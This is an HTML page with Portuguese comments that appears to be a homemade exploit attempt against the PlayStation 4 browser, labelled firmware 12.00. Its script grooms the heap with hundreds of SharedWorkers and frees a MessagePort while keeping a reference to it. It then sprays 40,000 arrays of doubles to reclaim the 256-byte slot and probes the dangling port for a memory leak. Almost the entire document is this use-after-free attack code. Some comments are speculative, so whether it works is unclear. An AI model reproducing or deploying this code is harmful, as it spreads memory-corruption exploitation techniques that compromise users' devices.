<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 12.00 SNIPER (0x100)</title>
    
</head>
<body>

    <h1>ALVO CONFIRMADO: 0x100 (256 bytes)</h1>
    <h3>Latência de 8ms detectada. Iniciando injeção...</h3>

    <button onclick="start_sniper()">DISPARAR SNIPER</button>

    <div id="log">Sistema pronto.</div>

    <script>
        function log(msg, type = "info") {
            var d = document.getElementById("log");
            var color = "#ccc";
            if (type === "success") color = "#0f0";
            if (type === "warn") color = "#fc0";
            if (type === "fail") color = "#f00";
            
            d.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // =================================================================
        // 1. CONFIGURAÇÃO DO PAYLOAD (0x100)
        // =================================================================
        function build_payload() {
            // Tamanho Alvo: 256 bytes (0x100)
            // Header de Array Nativo: 16 bytes
            // Espaço útil: 240 bytes
            // Doubles (8 bytes): 240 / 8 = 30 elementos
            
            var arr = new Array(30);
            
            // Valor Marcador: 1.1 (0x3FF199999999999A)
            // Este valor é seguro para o JS, mas se o Kernel ler como ponteiro
            // de VTable, ele aponta para um endereço Userland alto (seguro).
            // Isso deve evitar o Panic imediato e permitir o Leak.
            for(var i=0; i<arr.length; i++) {
                arr[i] = 1.1; 
            }
            
            return arr;
        }

        // =================================================================
        // 2. EXECUÇÃO
        // =================================================================
        var workers_stash = [];

        async function start_sniper() {
            if(!window.SharedWorker) return log("Erro: Navegador.", "fail");
            
            var payload = build_payload();
            log("Payload 0x100 (30 Doubles) construído.", "success");

            // FASE 1: GROOMING (380)
            log("Grooming (Base 380)...");
            workers_stash = [];
            for(let i=0; i<380; i++) {
                try { workers_stash.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
            }

            // FASE 2: TRIGGER (403)
            // Paramos um antes do crash (404) para ter estabilidade
            var p_count = 0;
            var limit = 403 - 380; 

            var it = setInterval(() => {
                if (p_count >= limit) {
                    clearInterval(it);
                    
                    // --- O MOMENTO ---
                    log("!!! ALVO NA MIRA (403) !!!", "warn");
                    
                    // Vítima
                    var v = workers_stash.pop();
                    var p = v.port; // Referência para Leak
                    
                    // FREE
                    v.port.close();
                    v = null;
                    
                    // SPRAY MASSIVO (Reclaim 0x100)
                    log("Disparando Spray (Reclaim 0x100)...");
                    var spray = [];
                    // 40.000 cópias = ~10MB de RAM. Seguro e denso.
                    for(var k=0; k<40000; k++) {
                        spray.push(payload.slice(0));
                    }

                    // CHECK (LEAK)
                    setTimeout(() => {
                        check_success(p);
                    }, 500);
                    
                    return;
                }
                
                try {
                    let w = new SharedWorker("data:text,1", "v"+p_count);
                    w.port.start();
                    workers_stash.push(w);
                    if(p_count % 2 == 0) log(`Worker ${381+p_count} alocado.`);
                } catch(e) {}
                p_count++;
            }, 60);
        }

        function check_success(port) {
            try {
                log("Sondando objeto...", "warn");
                
                // Se o objeto foi substituído pelo nosso Array de Doubles,
                // a estrutura interna mudou. O .toString() deve falhar ou mudar.
                var s = port.toString();
                
                if (s.indexOf("MessagePort") === -1) {
                    log("!!! BINGO !!!", "success");
                    log("Objeto Corrompido: " + s, "success");
                    alert("SUCESSO! Leak 0x100 Confirmado.");
                } else {
                    log("Falha: Objeto ainda é MessagePort.");
                    
                    // Teste de Estresse (Force Crash se corrompido)
                    // Tenta ler propriedade que virou lixo (1.1)
                    try { let x = port.onmessage; } catch(e) {
                        if(e.toString().match(/0x/)) {
                            log("LEAK NO ERRO: " + e, "success");
                            alert("LEAK NO ERRO!");
                        }
                    }
                }
            } catch(e) {
                log("ERRO DE ACESSO (BOM SINAL): " + e, "success");
                alert("Erro de Acesso! (Provável Leak)");
            }
            
            // Limpeza
            workers_stash.forEach(w => { try{w.port.close()}catch(e){} });
        }
    </script>
</body>
</html>
